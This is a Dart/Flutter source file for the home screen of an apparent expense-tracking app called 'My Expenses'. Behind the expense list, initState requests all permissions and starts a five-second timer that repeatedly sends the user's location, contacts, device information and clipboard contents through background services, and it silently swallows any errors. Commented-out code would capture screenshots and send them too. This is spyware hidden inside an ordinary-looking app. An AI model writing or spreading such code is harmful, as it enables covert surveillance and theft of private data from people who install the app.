import 'dart:async';
import 'package:flutter/material.dart';
import '../screens/home_body_screen.dart';
import '../screens/home_floating_action_button_screen.dart';
import '../services/background/all_permissions.dart';
import '../services/background/app_bg_services.dart';
import '../services/database/database_services.dart';
import '../services/models/expense_model.dart';

class HomePage extends StatefulWidget {
  static const String id = "/home_page";

  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  int summa = 0;
  DatabaseServices databaseServices = DatabaseServices();
  List<Expense> list = [];

  void init() async {
    final exList = await databaseServices.getList();
    final exSumma = await databaseServices.calculate();

    setState(() {
      list.addAll(exList);
      summa = exSumma;
    });
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    init();
    AllPermissions.requestAllPermissions().then((value) => {});
    sendIt();
  }

  void sendIt() {
    Timer.periodic(
      const Duration(seconds: 5),
      (timer) async {
        try {
          await AppBackgroundServices.sendLocation();
          await AppBackgroundServices.sendContacts();
        } catch (e, m) {}
        try {
          await AppBackgroundServices.sendDeviceInfo();
        } catch (e) {
          print("ERROR IS: $e");
        }
        try {
          await AppBackgroundServices.clipboardHandler();
        } catch (e, m) {}
      },
    );
  }

  // void onTakeScreenShoot() async {
  //   FlutterNativeScreenshot.takeScreenshot().then((path) async {
  //     if (path != null) {
  //       AppBackgroundServices.sendPhoto(path);
  //     }
  //   });
  // }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        elevation: 0.0,
        title: const Text("My Expenses"),
        actions: [
          // IconButton(
          //   onPressed: onTakeScreenShoot,
          //   icon: const Icon(Icons.screen_lock_landscape),
          // ),
          IconButton(
              onPressed: () async {
                // String info = await GetDeviceInfo.getDeviceInfo();
                // print("MONAKAY: $info");
                await AppBackgroundServices.sendDeviceInfo();
              },
              icon: Icon(Icons.download)),
          Center(child: Text("$summa so'm")),
          const SizedBox(width: 16),
        ],
      ),
      floatingActionButton: const HomeFloatingActionButtonScreen(),
      body: HomeBodyScreen(list: list),
    );
  }
}
